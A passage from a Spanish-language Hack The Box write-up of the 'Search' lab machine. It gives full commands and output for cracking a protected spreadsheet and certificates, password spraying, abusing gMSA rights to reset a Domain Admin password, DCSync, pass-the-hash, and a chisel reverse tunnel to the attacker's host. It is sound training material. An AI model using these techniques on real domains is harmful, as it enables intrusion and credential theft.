+drw-rw-rw-          0  Mon Aug 10 06:02:16 2020 ..
+drw-rw-rw-          0  Thu Apr  9 16:05:29 2020 $RECYCLE.BIN
+-rw-rw-rw-        282  Mon Aug 10 06:02:16 2020 desktop.ini
+-rw-rw-rw-       1450  Thu Apr  9 16:05:03 2020 Microsoft Edge.lnk
+-rw-rw-rw-      23130  Mon Aug 10 06:30:05 2020 Phishing_Attempt.xlsx
+# get Phishing_Attempt.xlsx
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir el archivo xlsx con <code class="language-plaintext highlighter-rouge">LibreOffice</code> podemos ver algunos nombres de usuarios, sin embargo no podemos ver la columna <code class="language-plaintext highlighter-rouge">C</code> y abajo nos dice que esta protegido</p>
+<a href="/htb/search/5.png" target="_blank"><div><p><img src="/htb/search/5.png"></p></div></a>
+<a href="/htb/search/6.png" target="_blank"><div><p><img src="/htb/search/6.png"></p></div></a>
+
+<p class="plain-text">La <code class="language-plaintext highlighter-rouge">protección</code> usada en este caso es facil de bypassear, iniciamos <code class="language-plaintext highlighter-rouge">unzipeando</code> el archivo xlsx para asi tener acceso a todos los archivos de configuración en <code class="language-plaintext highlighter-rouge">xml</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unzip </span><span class="p">Phishing_Attempt.xlsx
+Archive:  Phishing_Attempt.xlsx
+  inflating: [Content_Types].xml  
+  inflating: _rels/.rels        
+  inflating: xl/workbook.xml    
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/worksheets/sheet2.xml  
+  inflating: xl/theme/theme1.xml  
+  inflating: xl/styles.xml      
+  inflating: xl/sharedStrings.xml  
+  inflating: xl/drawings/drawing1.xml  
+  inflating: xl/charts/chart1.xml  
+  inflating: xl/charts/style1.xml  
+  inflating: xl/charts/colors1.xml  
+  inflating: xl/worksheets/_rels/sheet1.xml.rels  
+  inflating: xl/worksheets/_rels/sheet2.xml.rels  
+  inflating: xl/drawings/_rels/drawing1.xml.rels  
+  inflating: xl/charts/_rels/chart1.xml.rels  
+  inflating: xl/printerSettings/printerSettings1.bin  
+  inflating: xl/printerSettings/printerSettings2.bin  
+  inflating: xl/calcChain.xml   
+  inflating: docProps/core.xml  
+  inflating: docProps/app.xml</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">xl/worksheets/sheet1.xml</code> encontramos la configuraciónd de la protección, para quitarla basta con eliminar la etiqueta <code class="language-plaintext highlighter-rouge">sheetProtection</code> del xml</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">&ltsheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvermos a <code class="language-plaintext highlighter-rouge">comprimir</code> los archivos en un nuevo archivo con extensión <code class="language-plaintext highlighter-rouge">xlsx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ zip </span><span class="p">new.xlsx -r *    
+  adding: [Content_Types].xml (deflated 79%)
+  adding: docProps/ (stored 0%)
+  adding: docProps/app.xml (deflated 52%)
+  adding: docProps/core.xml (deflated 47%)
+  adding: _rels/ (stored 0%)
+  adding: _rels/.rels (deflated 60%)
+  adding: xl/ (stored 0%)
+  adding: xl/theme/ (stored 0%)
+  adding: xl/theme/theme1.xml (deflated 80%)
+  adding: xl/calcChain.xml (deflated 55%)
+  adding: xl/worksheets/ (stored 0%)
+  adding: xl/worksheets/_rels/ (stored 0%)
+  adding: xl/worksheets/_rels/sheet1.xml.rels (deflated 55%)
+  adding: xl/worksheets/_rels/sheet2.xml.rels (deflated 42%)
+  adding: xl/worksheets/sheet1.xml (deflated 79%)
+  adding: xl/worksheets/sheet2.xml (deflated 73%)
+  adding: xl/styles.xml (deflated 89%)
+  adding: xl/_rels/ (stored 0%)
+  adding: xl/_rels/workbook.xml.rels (deflated 74%)
+  adding: xl/printerSettings/ (stored 0%)
+  adding: xl/printerSettings/printerSettings2.bin (deflated 67%)  
+  adding: xl/printerSettings/printerSettings1.bin (deflated 67%)  
+  adding: xl/drawings/ (stored 0%)
+  adding: xl/drawings/_rels/ (stored 0%)
+  adding: xl/drawings/_rels/drawing1.xml.rels (deflated 39%)
+  adding: xl/drawings/drawing1.xml (deflated 58%)
+  adding: xl/charts/ (stored 0%)
+  adding: xl/charts/colors1.xml (deflated 73%)
+  adding: xl/charts/chart1.xml (deflated 77%)
+  adding: xl/charts/_rels/ (stored 0%)
+  adding: xl/charts/_rels/chart1.xml.rels (deflated 49%)
+  adding: xl/charts/style1.xml (deflated 90%)
+  adding: xl/sharedStrings.xml (deflated 55%)
+  adding: xl/workbook.xml (deflated 60%)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir el nuevo <code class="language-plaintext highlighter-rouge">xlsx</code> ahora tenemos acceso a la columna <code class="language-plaintext highlighter-rouge">C</code> la cual contiene la contraseña, tenemos una columna de <code class="language-plaintext highlighter-rouge">usuarios</code> y una de posibles <code class="language-plaintext highlighter-rouge">contraseñas</code></p>
+<a href="/htb/search/7.png" target="_blank"><div><p><img src="/htb/search/7.png"></p></div></a>
+
+<p class="plain-text">Creamos un archivo <code class="language-plaintext highlighter-rouge">txt</code> de ambas columnas y al probar las <code class="language-plaintext highlighter-rouge">credenciales</code> de cada linea conseguimos una autenticación valida, y esta es la del usuario <code class="language-plaintext highlighter-rouge">Sierra.Frye</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ro">[-] </span><span class="p">search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&66** STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-sierra.frye">
+<br><h3 class="post-title">Shell - sierra.frye</h3><br>
+
+<p class="plain-text">Al conectarnos al recurso <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code> como <code class="language-plaintext highlighter-rouge">Sierra.Frye</code> en su carpeta home vemos el archivo <code class="language-plaintext highlighter-rouge">user.txt</code> que es la primera <code class="language-plaintext highlighter-rouge">flag</code> que podemos descargar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">search.htb/Sierra.Frye:</span><span class="am">'$$49=wide=STRAIGHT=jordan=28$$18'</span><span class="p">@research.search.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use RedirectedFolders$
+# cd Sierra.Frye
+# ls
+drw-rw-rw-          0  Wed Nov 17 20:01:45 2021 .
+drw-rw-rw-          0  Wed Nov 17 20:01:45 2021 ..
+drw-rw-rw-          0  Wed Nov 17 20:08:17 2021 Desktop
+drw-rw-rw-          0  Fri Jul 31 10:42:19 2020 Documents
+drw-rw-rw-          0  Fri Jul 31 10:45:36 2020 Downloads
+-rw-rw-rw-         33  Wed Nov 17 20:01:45 2021 user.txt
+# get user.txt
+# exit
+
+</span><span class="ve">❯ cat </span><span class="p">user.txt
+7f5**************************401</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Además de la flag en el directorio <code class="language-plaintext highlighter-rouge">Backups</code> nos encontramos con <code class="language-plaintext highlighter-rouge">certificados</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"># cd Downloads
+# ls
+drw-rw-rw-          0  Fri Jul 31 10:45:36 2020 .
+drw-rw-rw-          0  Fri Jul 31 10:45:36 2020 ..
+drw-rw-rw-          0  Thu Jul 30 13:25:57 2020 $RECYCLE.BIN
+drw-rw-rw-          0  Mon Aug 10 16:39:17 2020 Backups
+-rw-rw-rw-        282  Fri Jul 31 10:42:18 2020 desktop.ini
+# cd Backups
+# ls
+drw-rw-rw-          0  Mon Aug 10 16:39:17 2020 .
+drw-rw-rw-          0  Mon Aug 10 16:39:17 2020 ..
+-rw-rw-rw-       2643  Fri Jul 31 11:04:11 2020 search-RESEARCH-CA.p12  
+-rw-rw-rw-       4326  Mon Aug 10 16:39:17 2020 staff.pfx
+# mget *
+[*] Downloading search-RESEARCH-CA.p12
+[*] Downloading staff.pfx
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo estos estan <code class="language-plaintext highlighter-rouge">protegidos</code> con contraseña, para conseguirla primero podemos generar un <code class="language-plaintext highlighter-rouge">hash</code> para cada uno de ellos usando la herramienta <code class="language-plaintext highlighter-rouge">pfx2john</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ pfx2john </span><span class="p">search-RESEARCH-CA.p12 > hashes  
+</span><span class="ve">❯ pfx2john </span><span class="p">staff.pfx >> hashes</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al crackear los hashes conseguimos la contraseña <code class="language-plaintext highlighter-rouge">misspissy</code> para ambos archivos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 XOP 4x2])  
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">misspissy</span><span class="p">        (</span><span class="am">search-RESEARCH-CA.p12</span><span class="p">)
+</span><span class="am">misspissy</span><span class="p">        (</span><span class="am">staff.pfx</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos importar los <code class="language-plaintext highlighter-rouge">certificados</code> a Chrome o Firefox donde nos pedira la <code class="language-plaintext highlighter-rouge">contraseña</code> con la que estan protegidos, que ya sabemos es <code class="language-plaintext highlighter-rouge">misspissy</code></p>
+<a href="/htb/search/8.png" target="_blank"><div><p><img src="/htb/search/8.png"></p></div></a>
+<a href="/htb/search/9.png" target="_blank"><div><p><img src="/htb/search/9.png"></p></div></a>
+
+<p class="plain-text">Esto nos permitirá acceder al recurso <code class="language-plaintext highlighter-rouge">/staff</code> por <code class="language-plaintext highlighter-rouge">https</code> que de antes nos devolvia un codigo <code class="language-plaintext highlighter-rouge">403 Forbidden</code>, al acceder a el nos preguntara que <code class="language-plaintext highlighter-rouge">certificado</code> usar</p>
+<a href="/htb/search/10.png" target="_blank"><div><p><img src="/htb/search/10.png"></p></div></a>
+
+<p class="plain-text">El directorio <code class="language-plaintext highlighter-rouge">/staff</code> es un <code class="language-plaintext highlighter-rouge">Windows Powershell Web Access</code> el cual nos permite autenticarnos con <code class="language-plaintext highlighter-rouge">credenciales</code> a un ordenador y obtener una <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<a href="/htb/search/11.png" target="_blank"><div><p><img src="/htb/search/11.png"></p></div></a>
+
+<p class="plain-text">Tenemos las credenciales de <code class="language-plaintext highlighter-rouge">Sierra.Frye</code> a nivel de dominio y sabemos que el nombre del DC es <code class="language-plaintext highlighter-rouge">Research</code>, asi que con esta información nos podemos autenticar</p>
+<a href="/htb/search/12.png" target="_blank"><div><p><img src="/htb/search/12.png"></p></div></a>
+
+<p class="plain-text">Al autenticarnos obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code> como el usuario <code class="language-plaintext highlighter-rouge">Sierra.Frye</code></p>
+<a href="/htb/search/13.png" target="_blank"><div><p><img src="/htb/search/13.png"></p></div></a>
+
+</section>
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">bloodhound</code> vemos que <code class="language-plaintext highlighter-rouge">Sierra.Frye</code> gracias a sus grupos tiene el privilegio <code class="language-plaintext highlighter-rouge">ReadGMSAPassword</code> sobre <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> que tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el usuario <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> que esta en el grupo <code class="language-plaintext highlighter-rouge">Domain Admins</code></p>
+<a href="/htb/search/14.png" target="_blank"><div><p><img src="/htb/search/14.png"></p></div></a>
+
+<p class="plain-text">Para explotarlo como <code class="language-plaintext highlighter-rouge">Sierra.Frye</code> obtenemos la contraseña de <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> utilizando la propiedad <code class="language-plaintext highlighter-rouge">msDS-ManagedPassword</code> y definimos su credencial</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Sierra.Frye\Documents> </span><span class="ve">$GMSA </span><span class="c1">=</span><span class="p"> (</span><span class="am">Get-ADServiceAccount </span><span class="c1">-Identity </span><span class="az">'BIR-ADFS-GMSA' </span><span class="c1">-Properties </span><span class="az">'msDS-ManagedPassword'</span><span class="p">).</span><span class="az">'msDS-ManagedPassword'</span><span class="p">  
+PS C:\Users\Sierra.Frye\Documents> </span><span class="ve">$SecPassword </span><span class="c1">=</span><span class="p"> (</span><span class="am">ConvertFrom-ADManagedPasswordBlob </span><span class="ve">$GMSA</span><span class="p">).SecureCurrentPassword
+PS C:\Users\Sierra.Frye\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential BIR-ADFS-GMSA, </span><span class="ve">$SecPassword</span><span class="p">
+PS C:\Users\Sierra.Frye\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Utilizando esta <code class="language-plaintext highlighter-rouge">credencial</code> de powershell podemos ejecutar comandos como el usuario <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> en la máquina <code class="language-plaintext highlighter-rouge">Research</code> que es el controlador de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Sierra.Frye\Documents> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">Research </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command</span><span class="p"> { </span><span class="am">whoami</span><span class="p"> }  
+search\bir-adfs-gmsa$
+PS C:\Users\Sierra.Frye\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que este usuario tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el usuario <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> podemos simplemente cambiar su <code class="language-plaintext highlighter-rouge">contraseña</code> usando el comando <code class="language-plaintext highlighter-rouge">net</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Sierra.Frye\Documents> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">Research </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">net </span><span class="p">user Tristan.Davies password123# }  
+The command completed successfully.
+
+PS C:\Users\Sierra.Frye\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos los cambios con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y es valida, ya que es parte del grupo <code class="language-plaintext highlighter-rouge">Domain Admins</code> nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> que nos indica que tiene privilegios maximos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u Tristan.Davies -p password123#
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Tristan.Davies:password123# </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora mediante un DCSync dumpearemos el <code class="language-plaintext highlighter-rouge">ntds.dit</code> y nos interesa de manera especifica el hash <code class="language-plaintext highlighter-rouge">NT</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> para hacer un passthehash</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u Tristan.Davies -p password123# --ntds drsuapi --user Administrator  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Tristan.Davies:password123# </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora utilizando <code class="language-plaintext highlighter-rouge">psexec</code> o <code class="language-plaintext highlighter-rouge">wmiexec</code> para poder obtener una <code class="language-plaintext highlighter-rouge">powershell</code> podemos autenticarnos utilizando el <code class="language-plaintext highlighter-rouge">hash</code> y poder ejecutar comandos como <code class="language-plaintext highlighter-rouge">Administrator</code><p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">search.htb/Administrator@research.search.htb -hashes :5e3c0abbe0b4163c5612afe25c69ced6 -shell-type powershell  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+search\administrator
+
+PS C:\> </span><span class="am">type</span><span class="p"> C:\Users\Administrator\Desktop\root.txt
+070a4fc417f6463e27d90f8216538441
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El servicio de <code class="language-plaintext highlighter-rouge">winrm</code> no esta disponible desde fuera sin embargo ahora podemos crear un <code class="language-plaintext highlighter-rouge">proxy</code> con <code class="language-plaintext highlighter-rouge">chisel</code> y asi poder tener acceso a todos los <code class="language-plaintext highlighter-rouge">puertos</code> internos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\> </span><span class="am">.\chisel</span><span class="p"> client 10.10.14.10:9999 R:socks  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999
+server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente con <code class="language-plaintext highlighter-rouge">proxychains</code> validamos que tengamos conexion por <code class="language-plaintext highlighter-rouge">winrm</code> y nos conectamos como <code class="language-plaintext highlighter-rouge">Administrator</code> con el hash a la máquina utilizando <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec winrm search.htb -u Administrator -H 5e3c0abbe0b4163c5612afe25c69ced6
+</span><span class="az">SMB         </span><span class="p">search.htb      5985   RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:RESEARCH) (domain:search.htb)
+</span><span class="az">HTTP        </span><span class="p">search.htb      5985   RESEARCH         </span><span class="az">[*] </span><span class="p">http://search.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">search.htb      5985   RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Administrator:5e3c0abbe0b4163c5612afe25c69ced6 </span><span class="am">(Pwn3d!)  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i search.htb -u Administrator -H 5e3c0abbe0b4163c5612afe25c69ced6  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+search\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+070a4fc417f6463e27d90f8216538441
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="altern-Administrator">
+<br><h3 class="post-title">Alternativa - Administrator</h3><br>
+
+<p class="plain-text">Como alternativa para no tener que obtener la <code class="language-plaintext highlighter-rouge">powershell</code> desde la web podemos dumpear directamente el hash NT de <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> con <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper.py</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">gMSADumper.py -u Sierra.Frye -p </span><span class="am">'$$49=wide=STRAIGHT=jordan=28$$18'</span><span class="p"> -d search.htb -l search.htb  
+Users or groups who can read password for BIR-ADFS-GMSA$:
+ > ITSec
+BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
+BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:06e03fa99d7a99ee1e58d795dccc7065a08fe7629441e57ce463be2bc51acf38
+BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:dc4a4346f54c0df29313ff8a21151a42</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Validamos el hash NT con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y nos devuelve que este es valido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u BIR-ADFS-GMSA$ -H e1e9fd9e46d0d747e1595167eedcec0f
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\BIR-ADFS-GMSA$:e1e9fd9e46d0d747e1595167eedcec0f</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora mediante <code class="language-plaintext highlighter-rouge">rpc</code> utilizando el hash para autenticarnos como <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> podemos cambiar la contraseña del usuario <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> y asi dumpear el <code class="language-plaintext highlighter-rouge">ntds</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ net </span><span class="p">rpc password Tristan.Davies -U </span><span class="am">'search.htb/BIR-ADFS-GMSA$%e1e9fd9e46d0d747e1595167eedcec0f'</span><span class="p"> -S research.search.htb --pw-nt-hash  
+Enter new password for Tristan.Davies: password123#</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u Tristan.Davies -p password123# --ntds drsuapi --user Administrator  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Tristan.Davies:password123# </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
